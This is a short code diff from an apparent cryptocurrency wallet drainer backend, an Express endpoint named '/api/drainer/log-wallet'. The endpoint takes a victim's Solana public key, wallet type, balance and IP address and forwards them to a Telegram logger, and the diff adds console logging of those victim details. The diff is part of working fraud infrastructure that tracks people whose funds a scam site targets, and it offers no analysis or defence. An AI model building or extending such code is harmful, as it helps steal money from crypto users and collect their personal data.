@@ -33,6 +33,13 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
     const { publicKey, walletType, origin, userAgent, lamports } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     
+    console.log('[SERVER] Received wallet log request:', {
+      publicKey: publicKey,
+      walletType: walletType,
+      lamports: lamports,
+      ip: userIp
+    });
+    
     const telegramLogger = (await import('./src/telegram.js')).default;
     
     // Log wallet detection (this will be called from frontend)
